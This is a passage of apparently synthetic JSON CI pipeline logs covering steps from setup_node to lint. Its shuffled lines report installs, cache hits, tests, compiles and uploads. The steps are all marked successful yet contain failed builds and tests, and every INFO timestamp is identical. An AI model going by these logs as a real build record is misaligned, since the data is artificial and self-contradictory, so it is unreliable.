          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-1727",
          "  PASS: test_db_connect (180ms)",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (275ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-6473",
          "[12:00:30] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_db_connect (39ms)",
          "  PASS: test_user_create (101ms)",
          "WARNING: lodash has known vulnerabilities",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 7/10: Building",
          "Cache hit for key-9625",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 test completed",
          "Cache hit for key-4266",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Installing lodash@3.17.0",
          "Installing express@3.8.0",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-10T12:01:40.384372",
        "finished_at": "2025-12-10T12:01:56.331079",
        "log_lines": [
          "=== Step: setup_node ===",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Step 2/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@4.4.0",
          "  PASS: test_api_health (275ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_cache_hit (395ms)",
          "[12:00:30] INFO: Processing request",
          "Installing jest@4.5.0",
          "[12:00:30] INFO: Processing request",
          "Installing react@2.9.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-3893",
          "  PASS: test_cache_hit (135ms)",
          "Step 7/10: Building",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Cache hit for key-8492",
          "Installing react@3.5.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-2645",
          "  PASS: test_auth_login (84ms)",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Installing jest@4.1.0",
          "Cache hit for key-2892",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 66",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "  PASS: test_auth_login (173ms)",
          "Installing lodash@3.7.0",
          "\u2713 test completed",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-1935",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (160ms)",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "[12:00:30] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "WARNING: eslint has known vulnerabilities",
          "Installing express@2.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (450ms)",
          "Installing webpack@4.5.0",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (88ms)",
          "Cache hit for key-1041",
          "Step 7/10: Building",
          "Cache hit for key-1853",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_user_create (194ms)",
          "  PASS: test_db_connect (122ms)",
          "Cache hit for key-5673",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-1158",
          "Step 3/10: Building",
          "[12:00:30] ERROR: Connection failed",
          "Cache hit for key-3192",
          "\u2713 build completed",
          "Cache hit for key-2969",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Installing webpack@5.11.0",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Cache hit for key-3352",
          "Step 6/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing jest@5.8.0",
          "Compiling src/service.java...",
          "  PASS: test_user_create (40ms)",
          "Installing webpack@2.20.0",
          "Exception: ValueError",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (483ms)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Cache hit for key-5391",
          "Step 5/10: Building",
          "Installing eslint@5.14.0",
          "Exception: TypeError",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-4098",
          "[12:00:30] INFO: Processing request",
          "Installing eslint@1.1.0",
          "[12:00:30] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing eslint@2.3.0",
          "Compiling src/utils.go...",
          "Installing eslint@1.9.0",
          "Step 10/10: Building",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_cache_hit (192ms)",
          "  PASS: test_auth_login (170ms)",
          "\u2713 build completed",
          "Cache hit for key-4189",
          "\u2713 build completed",
          "Cache hit for key-7025",
          "Installing axios@2.19.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-10T12:01:56.331079",
        "finished_at": "2025-12-10T12:02:28.224494",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 10/10: Building",
          "Step 5/10: Building",
          "Cache hit for key-2261",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Installing webpack@4.16.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Installing express@2.11.0",
          "Step 7/10: Building",
          "Compiling src/utils.go...",
          "Installing lodash@3.19.0",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 10/10: Building",
          "[12:00:30] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-8601",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "  PASS: test_user_create (123ms)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (48ms)",
          "Exception: ValueError",
          "Exception: TypeError",
          "Cache hit for key-6790",
          "Compiling src/service.java...",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-2295",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_user_create (56ms)",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Installing prettier@5.16.0",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Cache hit for key-2273",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-6415",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-5920",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/service.java...",
          "  PASS: test_user_create (417ms)",
          "Installing eslint@2.11.0",
          "Cache hit for key-2961",
          "Compiling src/index.js...",
          "  PASS: test_api_health (459ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Installing react@3.10.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-6474",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "WARNING: eslint has known vulnerabilities",
          "Installing webpack@5.6.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/app.ts...",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "Step 2/10: Building",
          "Exception: RuntimeError",
          "Exception: NullPointerException",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Cache hit for key-6242",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (180ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "\u2717 build failed with exit code 101",
          "[12:00:30] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing prettier@4.8.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Installing lodash@5.11.0",
          "Installing eslint@5.9.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing lodash@2.4.0",
          "Installing webpack@2.9.0",
          "[12:00:30] INFO: Processing request",
          "Installing jest@4.17.0",
          "FAILED: test_api_health",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-10T12:02:28.224494",
        "finished_at": "2025-12-10T12:03:16.064616",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 lint completed",
          "Installing prettier@1.15.0",
          "Compiling src/index.js...",
          "  PASS: test_user_create (220ms)",
          "[12:00:30] INFO: Processing request",
          "Installing express@5.14.0",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (86ms)",
          "Compiling src/index.js...",
          "Cache hit for key-9433",
          "Installing lodash@5.14.0",
          "Cache hit for key-8271",
          "\u2713 build completed",
          "Installing prettier@5.16.0",
          "  PASS: test_auth_login (222ms)",
          "Cache hit for key-9146",
          "Cache hit for key-2252",
          "Installing eslint@4.8.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Step 5/10: Building",
          "Cache hit for key-1662",
          "[12:00:30] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_api_health (220ms)",
          "\u2717 build failed with exit code 112",
          "Cache hit for key-7663",
          "Cache hit for key-1094",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_user_create (238ms)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:30] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "Step 7/10: Building",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_user_create (158ms)",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8310",
          "Installing webpack@1.19.0",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Installing lodash@3.20.0",
          "Installing jest@3.16.0",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing jest@5.17.0",
          "  PASS: test_auth_login (277ms)",
          "Step 2/10: Building",
          "Cache hit for key-2201",
          "Installing prettier@5.7.0",
          "\u2717 build failed with exit code 35",
          "[12:00:30] INFO: Processing request",
          "Exception: RuntimeError",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Installing react@5.0.0",
          "\u2713 test completed",
          "Installing webpack@1.4.0",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_user_create (440ms)",
          "  PASS: test_auth_login (145ms)",
          "Installing lodash@5.3.0",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing lodash@3.16.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "\u2713 test completed",
          "Step 3/10: Building",
          "  PASS: test_user_create (8ms)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_cache_hit (436ms)",
          "Step 6/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_api_health (63ms)",
          "Installing jest@5.12.0",
          "  PASS: test_cache_hit (210ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_db_connect (405ms)",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@5.3.0",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-10T12:03:16.064616",
        "finished_at": "2025-12-10T12:04:03.904738",
        "log_lines": [
          "=== Step: build ===",
          "\u2713 test completed",
          "  PASS: test_api_health (450ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_cache_hit (75ms)",
          "Cache hit for key-5283",
          "Cache hit for key-3560",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing react@5.13.0",
          "  PASS: test_cache_hit (332ms)",
          "Step 9/10: Building",
          "  PASS: test_api_health (18ms)",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (268ms)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-6773",
          "Installing webpack@4.13.0",
          "[12:00:30] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "Cache hit for key-4068",
          "Cache hit for key-3314",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 4/10: Building",
          "Installing express@2.16.0",
          "Installing express@1.5.0",
          "  PASS: test_auth_login (438ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing eslint@5.14.0",
          "Installing express@1.12.0",
          "Cache hit for key-1866",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:30] INFO: Processing request",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Installing lodash@2.0.0",
          "[12:00:30] ERROR: Connection failed",
          "Cache hit for key-5507",
          "Installing lodash@3.2.0",
          "Step 10/10: Building",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:30] INFO: Processing request",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-1373",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "[12:00:30] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing express@5.1.0",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:30] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing webpack@3.10.0",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (207ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_auth_login (268ms)",
          "Cache hit for key-3710",
          "Step 2/10: Building",
          "Cache hit for key-8653",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-2724",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:30] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_cache_hit (118ms)",
          "[12:00:30] INFO: Processing request",
          "Installing lodash@2.13.0",
          "Cache hit for key-8646",
          "\u2713 lint completed",
          "Installing lodash@3.18.0",
          "\u2713 build completed",
          "FAILED: test_auth_login",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Cache hit for key-6995",
          "Cache hit for key-8838",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "WARNING: axios has known vulnerabilities",
          "\u2713 test completed",
          "Cache hit for key-4265",
          "Compiling src/utils.go...",
          "Cache hit for key-6140",
          "Installing webpack@3.13.0",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-8393",
          "\u2713 build completed",
          "Step 10/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Installing eslint@2.20.0",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-10T12:04:03.904738",
        "finished_at": "2025-12-10T12:04:13.472762",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Cache hit for key-5345",
          "\u2713 lint completed",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2717 build failed with exit code 92",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-9031",
          "Cache hit for key-3168",
          "Cache hit for key-1303",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@2.0.0",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "Installing express@3.18.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "Installing webpack@1.1.0",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Cache hit for key-4208",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-5822",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 47",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Installing express@3.1.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "FAILED: test_cache_hit",
          "Installing prettier@2.16.0",
          "\u2713 lint completed",
          "Installing jest@5.19.0",
          "  PASS: test_db_connect (482ms)",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (298ms)",
          "\u2717 build failed with exit code 118",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-7985",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-9035",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (484ms)",
          "Installing prettier@1.13.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-9332",
          "Step 5/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (169ms)",
          "Step 2/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "Installing webpack@5.8.0",
          "Installing react@1.20.0",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@3.18.0",
          "Step 3/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing axios@3.4.0",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (404ms)",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "Step 2/10: Building",
          "Cache hit for key-2003",
          "  PASS: test_user_create (411ms)",
          "Installing jest@2.16.0",
          "Installing axios@3.9.0",
          "  PASS: test_user_create (393ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:30] INFO: Processing request",
          "Installing axios@4.16.0",
          "[12:00:30] INFO: Processing request",
          "Step 8/10: Building",
          "Step 2/10: Building",
          "Installing eslint@2.5.0",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "Installing jest@3.4.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_user_create (463ms)",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (315ms)",
          "  PASS: test_api_health (477ms)",
          "  PASS: test_cache_hit (375ms)",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 8/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/app.ts...",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (48ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-10T12:04:13.472762",
        "finished_at": "2025-12-10T12:04:29.419469",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Cache hit for key-3840",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "Cache hit for key-1787",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "Installing axios@5.14.0",
          "Cache hit for key-1947",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-8056",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing eslint@1.16.0",
          "Installing prettier@5.20.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-8131",
          "Installing eslint@2.3.0",
          "Step 2/10: Building",
          "[12:00:30] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (282ms)",
          "Installing webpack@3.3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-2914",
          "Installing lodash@1.8.0",
          "Cache hit for key-3239",
          "Step 7/10: Building",
          "\u2717 build failed with exit code 112",
          "Step 10/10: Building",
          "  PASS: test_auth_login (11ms)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/10: Building",
          "Installing webpack@4.3.0",
          "Installing webpack@5.6.0",
          "  PASS: test_db_connect (54ms)",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-9207",
          "Cache hit for key-1203",
          "Step 5/10: Building",
          "WARNING: jest has known vulnerabilities",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-2802",
          "Installing lodash@2.0.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_cache_hit (249ms)",
          "\u2717 build failed with exit code 61",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_cache_hit",
          "Cache hit for key-7229",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing express@5.13.0",
          "Installing axios@4.3.0",
          "Installing eslint@3.19.0",
          "  PASS: test_api_health (482ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (166ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 test completed",
          "Cache hit for key-1523",
          "Installing eslint@3.6.0",
          "\u2717 build failed with exit code 99",
          "  PASS: test_db_connect (234ms)",
          "[12:00:30] INFO: Processing request",
          "Step 7/10: Building",
          "Cache hit for key-7661",
          "  PASS: test_cache_hit (249ms)",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "\u2717 build failed with exit code 89",
          "Cache hit for key-8715",
          "Cache hit for key-3387",
          "[12:00:30] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_user_create (225ms)",
          "[12:00:30] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_auth_login (338ms)",
          "  PASS: test_cache_hit (173ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_auth_login (128ms)",
          "  PASS: test_user_create (215ms)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-8577",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Installing jest@3.2.0",
          "Cache hit for key-7417",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing jest@5.14.0",
          "Step 8/10: Building",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (126ms)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "Compiling src/main.py...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-10T12:04:29.419469",
        "finished_at": "2025-12-10T12:04:45.366176",
        "log_lines": [
          "=== Step: lint ===",
          "Step 3/10: Building",
          "Exception: TypeError",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (9ms)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-7025",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_auth_login (297ms)",
          "Cache hit for key-7354",
          "Installing prettier@5.15.0",
          "Installing eslint@1.16.0",
          "Cache hit for key-1278",
          "[12:00:30] ERROR: Connection failed",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (347ms)",
          "  PASS: test_auth_login (200ms)",
          "Installing jest@1.2.0",
          "  PASS: test_auth_login (30ms)",
          "Step 10/10: Building",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@1.6.0",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-8593",
          "[12:00:30] ERROR: Connection failed",
          "Cache hit for key-1034",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_user_create (296ms)",
          "Cache hit for key-8169",
          "  PASS: test_auth_login (370ms)",
          "Step 3/10: Building",
          "Cache hit for key-4228",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (148ms)",
          "  PASS: test_api_health (114ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 2/10: Building",
          "Cache hit for key-8555",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
